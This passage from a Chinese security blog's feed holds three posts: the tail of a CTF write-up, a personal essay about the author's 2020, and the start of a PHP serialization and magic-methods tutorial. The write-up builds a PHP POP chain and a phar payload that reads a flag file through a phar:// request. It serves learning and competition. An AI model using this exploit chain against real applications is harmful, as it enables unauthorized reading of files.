            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$text</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>我们先关注有没有可以读取文件的地方，所有内容一共有两处：</p>
<ol>
<li><code>highlight_file($this-&gt;source);</code></li>
<li><code>$text = base64_encode(file_get_contents($value));</code></li>
</ol>
<p>跟进第一处发现有所过滤
<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-10780885.png" alt=""></p>
<p><code>f1ag</code>被ban，无法读取，看另外一处。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2480299101.png" alt=""></p>
<p>在<code>get()</code>函数下发现有调用<code>file_get()</code>,<code>__get()</code>调用了<code>get()</code>，现在需要找到调用不可访问对象的地方。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2434843641.png" alt=""></p>
<p>只要把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发<code>__get()</code>了。现在找一找把对象当作字符串处理的地方。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-1513267936.png" alt=""></p>
<p>不出意外的找到了，整个利用链也十分清晰。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">C1e4r</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Show</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Test</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>

<span class="p">}</span>

<span class="nv">$demo1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C1e4r</span><span class="p">();</span>
<span class="nv">$demo2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
<span class="nv">$demo3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
<span class="nv">$demo3</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/f1ag.php&#34;</span><span class="p">;</span><span class="c1">//目标文件
</span><span class="c1"></span><span class="nv">$demo2</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$demo3</span><span class="p">;</span>   <span class="c1">//触发__tostring
</span><span class="c1"></span><span class="nv">$demo1</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$demo2</span><span class="p">;</span>  <span class="c1">//触发__get;
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo1</span><span class="p">);</span>

<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;2.phar&#34;</span><span class="p">);</span> <span class="c1">//生成phar文件
</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$demo1</span><span class="p">);</span> <span class="c1">//触发头是C1e4r类
</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//生成签名
</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>生成phar文件后，上传需要改后缀，然后直接读取即可。</p>
<pre><code class="language-url" data-lang="url">file.php?file=phar://./upload/c38d8861438aff49fb8385d9fd4df1e4.jpg
</code></pre><h2 id="最后">最后</h2>
<p>其实<code>phar</code>兴起也是最近几年的事，到后来hitcon一年一题..其实考点都差不多，难的地方也是和其他内容打组合拳，下面还有一些关于phar的题目，感兴趣可以去试试。</p>
<ul>
<li>CISCN2019 Dropbox</li>
<li>bytectf2019 ezcms</li>
<li>hitcon···</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>关于2020</title>
			<link>https://theoyu.top/posts/essay/about2020/</link>
			<pubDate>Thu, 11 Feb 2021 22:11:11 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/essay/about2020/</guid>
			<description>​	年初还是一个十分迷茫的阶段，可能是疫情的原因，本来大一结束才划分的专业也提前开始，围着学长学姐打听四个小专业有什么异同。说来好笑，我最终选择信息安全的原因只是因为我只想选一个打代码少的专业。
​	不过也是疫情，给了我足够的时间去思考专业相关的事情，自学数据结构才真正发现编程的乐趣，那个长达3个月的寒假总的来说还是学了一些东西，也取得了不错的成绩。
​	5月左右陆陆续续回到学校，感觉周围人变了很多，又好像什么也没变。那时候迷上怪猎，每天差不多就是怪猎学习吃鸡这样，一直到正式回到教室才结束。感觉自己可能对一名女生有了好感，再三确认下应该没有错，但最后也只局限在她生日那天发了一句生日快乐..人总喜欢在未知的时候逞强，却又逃避现实，不过也挺好的。我好像很喜欢说”挺好的“这三个字。
​	9月迎来了第一场ctf比赛，问遍了周围所有人，都没能找到愿意和自己组队的队友，硬着头皮参赛。最后的得分也是古典密码和misc这一些,虽然没有拿到奖，不过还算是比较满足。
​	10月24日，也就是第二次校赛结束不久，老张找我和队友去办公室谈话，聊了很多，关于比赛，关于成绩，关于未来。老张真是一个很有魅力的老师，第一次听他的名字还是在大一采访保研学长的时候。也是同天，pz1o找了我，问也没有兴趣组个队，当时我把消息告诉骏哥的时候两个人都快要笑飞了哈哈哈。12月3日暂定小队名为Eurek4，契机是11月校赛一道Game逆向题的作弊码就是eureka，同时也希望我们比赛时能和阿基米德洗澡时一样发现真理，&amp;ldquo;Eureka&amp;rdquo;。
​	11月12月，陆陆续续参加了一些校外的比赛，才发现和其他人的差距实在太大，尽管有的差距是上大学前就已经奠定了，但我还是希望能有所改变。BXS是一个很强的队伍，以前是，现在是，未来也是。
​	回家过年，读研是每个亲人都会提起的话题，我只能腼腆一笑：“也许吧。” 我不想谈论，这无关我是否有机会卷得所谓的保研名额，这无关我根本对考研没有半点自信，这无关我是否已经对未来工作有了清楚的认识，我只想做好现在。或许我只是在逃避。但人这一生，又有多少机会可以去认真做一件钟爱的事情，我想我不会后悔。
​	新的一年，不出意外，我会攒钱买一台mac,会换一台手机,会多读一些文学相关的书，会依旧单身。我可能善长交朋友，但我学不会如何去经营，或许我就是一个疲于长期维护一段感情的人。
​	不管怎么说，明天也就是农历新年了，助您新年快乐，万事如意。</description>
			<content type="html"><![CDATA[<p>​		年初还是一个十分迷茫的阶段，可能是疫情的原因，本来大一结束才划分的专业也提前开始，围着学长学姐打听四个小专业有什么异同。说来好笑，我最终选择信息安全的原因只是因为我只想选一个打代码少的专业。</p>
<p>​		不过也是疫情，给了我足够的时间去思考专业相关的事情，自学数据结构才真正发现编程的乐趣，那个长达3个月的寒假总的来说还是学了一些东西，也取得了不错的成绩。</p>
<p>​		5月左右陆陆续续回到学校，感觉周围人变了很多，又好像什么也没变。那时候迷上怪猎，每天差不多就是怪猎学习吃鸡这样，一直到正式回到教室才结束。感觉自己可能对一名女生有了好感，再三确认下应该没有错，但最后也只局限在她生日那天发了一句生日快乐..人总喜欢在未知的时候逞强，却又逃避现实，不过也挺好的。我好像很喜欢说”挺好的“这三个字。</p>
<p>​		9月迎来了第一场ctf比赛，问遍了周围所有人，都没能找到愿意和自己组队的队友，硬着头皮参赛。最后的得分也是古典密码和misc这一些,虽然没有拿到奖，不过还算是比较满足。</p>
<p>​		10月24日，也就是第二次校赛结束不久，老张找我和队友去办公室谈话，聊了很多，关于比赛，关于成绩，关于未来。老张真是一个很有魅力的老师，第一次听他的名字还是在大一采访保研学长的时候。也是同天，pz1o找了我，问也没有兴趣组个队，当时我把消息告诉骏哥的时候两个人都快要笑飞了哈哈哈。12月3日暂定小队名为Eurek4，契机是11月校赛一道Game逆向题的作弊码就是<code>eureka</code>，同时也希望我们比赛时能和阿基米德洗澡时一样发现真理，<strong>&ldquo;Eureka&rdquo;。</strong></p>
<p>​		11月12月，陆陆续续参加了一些校外的比赛，才发现和其他人的差距实在太大，尽管有的差距是上大学前就已经奠定了，但我还是希望能有所改变。BXS是一个很强的队伍，以前是，现在是，未来也是。</p>
<p>​		回家过年，<strong>读研</strong>是每个亲人都会提起的话题，我只能腼腆一笑：“也许吧。”  我不想谈论，这无关我是否有机会卷得所谓的保研名额，这无关我根本对考研没有半点自信，这无关我是否已经对未来工作有了清楚的认识，我只想做好现在。或许我只是在逃避。但人这一生，又有多少机会可以去认真做一件钟爱的事情，我想我不会后悔。</p>
<p>​		新的一年，不出意外，我会攒钱买一台mac,会换一台手机,会多读一些文学相关的书，会依旧单身。我可能善长交朋友，但我学不会如何去经营，或许我就是一个疲于长期维护一段感情的人。</p>
<p>​		不管怎么说，明天也就是农历新年了，助您新年快乐，万事如意。</p>
]]></content>
		</item>
		
		<item>
			<title>浅谈php序列化与反序列化</title>
			<link>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</link>
			<pubDate>Mon, 09 Nov 2020 23:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
			<description>基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
也就是说，序列化的目的是方便传输和存储。
在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &amp;lt;?php $str=&amp;#39;Theoyu&amp;#39;; $bool=true; $null=NULL; $arr=array(&amp;#39;a&amp;#39;=&amp;gt;1,&amp;#39;b&amp;#39;=&amp;gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&amp;gt;x=$x; $this-&amp;gt;y=$y; } } $test=new A(3,&amp;#34;theoyu&amp;#34;); echo(serialize($str).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //s:6:&amp;#34;Theoyu&amp;#34;; echo(serialize($bool).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //b:1; echo(serialize($null).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //N; echo(serialize($arr).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //a:2{s:1:&amp;#34;a&amp;#34;;i:1;s:1:&amp;#34;b&amp;#34;;i:2;} echo(serialize($test).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //O:1:&amp;#34;A&amp;#34;:2:{s:1:&amp;#34;x&amp;#34;;i:3;s:4:&amp;#34;Ay&amp;#34;;s:6:&amp;#34;theoyu&amp;#34;;}  ?&amp;gt;序列化对不同类型得到的字符串格式为：
 string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&amp;ldquo;类名&amp;rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</description>
			<content type="html"><![CDATA[<h2 id="基础知识">基础知识</h2>
<blockquote>
<p>现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p>
<p>也就是说，序列化的目的是方便传输和存储。</p>
<p>在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。</p>
</blockquote>
<ul>
<li>PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用<code>serialize()</code>函数。</li>
<li>PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用<code>unserialize()</code>函数。</li>
<li>PHP反序列化漏洞：如果代码中使用了反序列化 <code>unserialize()</code>函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列<strong>magic</strong>方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。</li>
</ul>
<h2 id="序列化格式">序列化格式</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;Theoyu&#39;</span><span class="p">;</span>
<span class="nv">$bool</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
<span class="nv">$null</span><span class="o">=</span><span class="k">NULL</span><span class="p">;</span>
<span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">=&gt;</span><span class="mi">2</span><span class="p">);</span>

<span class="k">class</span> <span class="nc">A</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$x</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$y</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="nv">$y</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">x</span><span class="o">=</span><span class="nv">$x</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">y</span><span class="o">=</span><span class="nv">$y</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$test</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s2">&#34;theoyu&#34;</span><span class="p">);</span>      
<span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>    <span class="c1">//s:6:&#34;Theoyu&#34;;
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$bool</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//b:1;
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$null</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//N;
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>    <span class="c1">//a:2{s:1:&#34;a&#34;;i:1;s:1:&#34;b&#34;;i:2;}
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//O:1:&#34;A&#34;:2:{s:1:&#34;x&#34;;i:3;s:4:&#34;Ay&#34;;s:6:&#34;theoyu&#34;;}
</span><span class="c1"></span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>序列化对不同类型得到的字符串格式为：</p>
<ul>
<li>string ：   s:size:value;</li>
<li>Integer：  i:value;</li>
<li>Boolean   b:value;(1 or 0)</li>
<li>NULL       N;</li>
<li>Array       a:size:{key definition;value definition;······}definition 类似string or Integer</li>
<li>Object      O:类名长度:&ldquo;类名&rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}</li>
</ul>
<h2 id="magic-methods">Magic methods</h2>
<h3 id="php16个魔术方法">PHP16个魔术方法</h3>
<p>PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</p>
<ol>
<li>__construct():类的构造函数，当一个类被创建时自动调用</li>
<li>__destruct)(),类的析构函数，当一个类被销毁时自动调用</li>
<li>__sleep()，执行serialize()进行序列化时，先会调用这个函数</li>
<li>__wakeup()，执行unserialize()进行反序列化时，先会调用这个函数</li>
<li>__toString()，当把一个对象被当作字符串时被自动调用</li>
<li>__invoke()，当把一个类当作函数使用时自动调用</li>
<li>__call()，在对象中调用一个不可访问方法时调用</li>
<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
<li>__get()，获得一个类的不可访问成员变量时调用(不存在或为private)</li>
<li>__set()，设置一个类的成员变量时调用(不存在或为private)</li>
<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
<li>__clone()，当对象复制完成时调用</li>
<li>__autoload()，尝试加载未定义的类</li>
<li>__debugInfo()，打印所需调试信息
几个常用的魔术方法具体实现。</li>
</ol>
<p><code> __construct()</code></p>
<blockquote>
<p>类似c++的构造函数</p>
<p><strong>需要指出</strong>，PHP不支持构造函数重载，所以一个类只能声明<strong>一个</strong>构造函数！</p>
</blockquote>
<p><code>__destruct()</code></p>
<blockquote>
<p>同上，类似c++..</p>
</blockquote>
<p><code>__sleep()</code></p>
<blockquote>
<p>serialize()函数会检查类中是否存在一个魔术方法__sleep(),如果存在，则该方法会优先被调用。</p>
</blockquote>
<ul>
<li>该函数必须至少返回一个所包含对象中的变量名称</li>
<li>没有返回的变量将不会输出。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Person</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$sex</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$sex</span><span class="p">,</span><span class="nv">$age</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sex</span><span class="o">=</span><span class="nv">$sex</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">=</span><span class="nv">$age</span><span class="p">;</span>       
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s2">&#34;我是__sleep()函数，我被调用了,你以为你还叫theoyu？&lt;br&gt;&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span><span class="c1">//没有返回age
</span><span class="c1"></span>    <span class="p">}</span>


<span class="p">}</span>
<span class="nv">$person</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">,</span><span class="s1">&#39;男&#39;</span><span class="p">,</span><span class="s1">&#39;20&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>输出：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">我是__sleep()函数，我被调用了,你以为你还叫theoyu？
O:6:&#34;Person&#34;:2 :{s:4:&#34;name&#34;;s:8:&#34;dGhlb3l1&#34;;s:3:&#34;sex&#34;;s:3:&#34;男&#34;;}
</code></pre></div><p>没有年龄。</p>
<p><code>__wakeup()</code></p>
<blockquote>
<p>unserialize()前会检查是否存在__wakeup()，如果存在会优先调动。</p>
<p>和__sleep()相比，不需要返回数组。</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Person</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$sex</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$sex</span><span class="p">,</span><span class="nv">$age</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sex</span><span class="o">=</span><span class="nv">$sex</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">=</span><span class="nv">$age</span><span class="p">;</span>       
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s2">&#34;我是__sleep()函数，我被调用了,你以为你还叫theoyu？&lt;br&gt;&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s2">&#34;我是__wakeup()函数，你重新拥有了你的名字&lt;br&gt;&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">));</span> <span class="c1">//这里需要两次解码，因为__sleep()调用了两次
</span><span class="c1"></span>    <span class="p">}</span>


<span class="p">}</span>
<span class="nv">$person</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">,</span><span class="s1">&#39;男&#39;</span><span class="p">,</span><span class="s1">&#39;20&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)));</span>

<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>输出：</p>
<pre><code>我是__sleep()函数，我被调用了,你以为你还叫theoyu？
O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;dGhlb3l1&quot;;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;}
我是__sleep()函数，我被调用了,你以为你还叫theoyu？
我是__wakeup()函数，你重新拥有了你的名字
object(Person)#2 (3) { [&quot;name&quot;]=&gt; string(6) &quot;theoyu&quot; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;age&quot;]=&gt; NULL }
</code></pre><p>&hellip;忽然发现好中二= =</p>
<p><code>__toString()</code></p>
<ul>
<li><strong>__toString()</strong> 用于一个对象被当作字符串时应该如何回应，应该显示什么。</li>
<li><strong>__toString()</strong> 必须返回一个字符串。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">A</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$str</span><span class="o">=</span><span class="s2">&#34;this is __toString&#34;</span><span class="p">;</span>
            <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>    <span class="c1">//__toString() must return a string value
</span><span class="c1"></span>        <span class="p">}</span>

    <span class="p">}</span>
     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
     <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>         <span class="c1">//this is __toString
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code>__invoke()</code></p>
<ul>
<li>一个对象被当作函数调用时，<strong>__invoke()</strong> 会自动被调用。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">A</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&#34;this is __invoke&#34;</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span>
     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
     <span class="nv">$a</span><span class="p">();</span>         <span class="c1">//this is __invoke
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code> __call()</code></p>
<ul>
<li>调用类不存在的函数时，__call()会被调用，保证程序正常进行。</li>
<li>格式 <strong>function __call($function_name,$arguments)</strong></li>
<li>第一个参数会自动接收不存在函数的函数名，第二个参数以<strong>数组</strong>方式接收不存在函数的多个参数。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">A</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>

        <span class="p">}</span>
